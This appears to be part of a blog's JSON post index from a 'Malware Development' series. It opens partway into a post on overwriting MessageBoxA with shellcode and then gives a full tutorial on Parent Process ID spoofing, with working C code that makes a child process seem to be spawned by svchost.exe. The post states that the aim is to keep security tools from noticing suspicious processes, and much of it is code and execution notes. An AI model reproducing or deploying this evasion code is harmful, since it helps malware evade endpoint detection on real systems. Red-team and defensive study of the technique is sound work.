printf(\"CreateThread failed with error %d\\\\n\", GetLastError());    goto end;    }    end:    printf(\"Press Enter to exit: \");    getchar();    }EXECUTIONGetting address of MessageBoxA.Before changing the permission of the page where messageboxA lies i.e. on .text section.After changing the page permission to Read write.Before overwriting the messageboxA with shellcodeAfter writing the shellcodeCompleting the Execution"
  },
  
  {
    "title": "Spoofing Parent Process ID (PPID)",
    "url": "/posts/spoofing_parent_process_id/",
    "categories": "Malware Development",
    "tags": "Malware Development",
    "date": "2024-07-29 15:34:00 +0545",
    





    
    "snippet": "Parent Process ID (PPID) spoofing is a technique used to manipulate the relationship between a child process and its parent process. This makes it appear as though the child process was initiated b...",
    "content": "Parent Process ID (PPID) spoofing is a technique used to manipulate the relationship between a child process and its parent process. This makes it appear as though the child process was initiated by a different, legitimate process.This can be achieved by modifying the parent process ID, making it appear as though the process originated from a trusted source. For example, an Excel sheet spawning a `cmd.exe` process would typically raise suspicions with security solutions, but `svchost.exe` spawning a `cmd.exe` would not.Let’s explore how to spoof the Parent Process ID (PPID) of a process.Creating a processTo spoof a process PPID, we first need to create a process using the CreateProcess WinAPI with the EXTENDED_STARTUPINFO_PRESENT flag set in the dwCreationFlags parameter. According to Microsoft documentation, this requires a STARTUPINFOEX structure in the lpStartupInfo parameter.STARTUPINFOEX structureThe STARTUPINFOEX structure specifies the window station, desktop, standard handles, and attributes for a new process. Since it is responsible for defining attributes for a new process, it will be particularly useful for our purpose.The structure STARTUPINFOEX is shown below.typedef struct _STARTUPINFOEXW {    STARTUPINFOW StartupInfo;    LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList;} STARTUPINFOEXW, *LPSTARTUPINFOEXW;  Startupinfo: same as Startupinfo structure which was used to create a normal process.  lpAttributeList: An attribute list. This list is created by the InitializeProcThreadAttributeList function.As the InitializeProcThreadAttributeList function creates an attribute list for the process in inside STARTUPINFOEX structure. we have to take a look at it.InitializeProcThreadAttributeListInitializeProcThreadAttributeList is responsible for Initializing the specified list of attributes for process and thread creation.The InitializeProcThreadAttributeList function is shown below:BOOL InitializeProcThreadAttributeList(  [out, optional] LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,  [in]            DWORD                        dwAttributeCount,                  DWORD                        dwFlags,  [in, out]       PSIZE_T                      lpSize);parameters:  lpAttributeList: A pointer to the attribute list.  dwAttributeCount: The number of attributes to set.  dwFlags: This parameter is reserved and must be zero.  lpSize: This will return the size required to set the attributes.The dwAttributeCountwill be set to 1 since only one attribute is needed.According to the microsoft the initial call to this function will return an error by design which will return the size required to allocate enough space for the data in the lpAttributelist buffer and call the function again to initialize the buffer. next the UpdateProcThreadAttributefunction will be responsible for adding attributes to the list.UpdateProcThreadAttributeThe UpdateProcThreadAttribute function is shown belowBOOL UpdateProcThreadAttribute(  [in, out]       LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,  [in]            DWORD                        dwFlags,  [in]            DWORD_PTR                    Attribute,  [in]            PVOID                        lpValue,  [in]            SIZE_T                       cbSize,  [out, optional] PVOID                        lpPreviousValue,  [in, optional]  PSIZE_T                      lpReturnSize);parameters:  lpAttributeList: A pointer to the attribute list initialized by InitializeProcThreadAttributeList. This list contains attributes to be updated.  dwFlags: Reserved; must be zero.      Attribute: The attribute to update. For our spoofing of PPID the PROC_THREAD_ATTRIBUTE_PARENT_PROCESS is required.    lpValue: A pointer to the value for the attribute being updated. in our case of PPID spoofing it becomes the handle of the parent process.  cbSize: The size of the value pointed to by lpValue, in bytes.  lpPreviousValue: Optional. A pointer to receive the previous value of the attribute, if needed.  lpReturnSize: Optional. A pointer to receive the size of the previous attribute value returned in lpPreviousValue.LOGIC  call InitializeProcThreadAttributeList to set the number of attributes to be set and allocate enough space for the attributelist.  call UpdateProcThreadAttribute with PROC_THREAD_ATTRIBUTE_PARENT_PROCESS to initialize the attribute.  call CreateProcessW with the EXTENDED_STARTUPINFO_PRESENT flag and utilize the STARTUPINFOEXW structure that has been initialized using InitializeProcThreadAttributeList and updated using UpdateProcThreadAttributeParentPIDSpoofing functionParentPIDSpoofing is a function that creates process with Spoofed PPID.parameters:  hprocess: handle of the parent process whose PID is to be spoofed.  newprocessname: name of the process to create.  hnewprocess: A pointer to the handle which receives handle to the newly created process.  dwnewPID: A pointer to the PID which receives PID of the newly created process.    BOOL ParentPIDSpoofing(handle hprocess, LPWSTR newprocessname, HANDLE* hnewprocess, DWORD *dwnewPID) {    STARTUPINFOEXW SI = { 0 };    PROCESS_INFORMATION PI = { 0 };    SI.StartupInfo.cb = sizeof(STARTUPINFOW);    SIZE_T Attributelist = 0;    SI.StartupInfo.cb = sizeof(STARTUPINFOEXW);    InitializeProcThreadAttributeList(NULL, 1, 0, &amp;Attributelist);    SI.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, Attributelist);    if (SI.lpAttributeList == NULL) {    printf(\"Heap alloc failed with error no %x\\n\", GetLastError());    return FALSE;    }    if (!InitializeProcThreadAttributeList(SI.lpAttributeList, 1, 0, &amp;Attributelist)) {    printf(\"InitializeProcThreadAttirbuteList failed with error no %x\\n\", GetLastError());    return FALSE;    }    if (!UpdateProcThreadAttribute(SI.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &amp;hprocess, sizeof(hprocess), NULL, NULL)) {    printf(\"UpdateProcThreadAttirbute failed with error no %x\\n\", GetLastError());    return FALSE;    }    if (!CreateProcessW(NULL, newprocessname, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &amp;SI.StartupInfo, &amp;PI)) {    printf(\"The CreateprocessW failed with error no %x\\n\", GetLastError());    return FALSE;    }    *hnewprocess = PI.hProcess;    *dwnewPID = PI.dwProcessId;    return TRUE;    }ExecutionCreate the child process Notepad.exe with the parent process being svchost.exe, which has a PID of 4312.NOTE: svchost.exe is running with normal privileges.Notepad.exe appears to be spawned by svchost.exe ."
  }
  
]

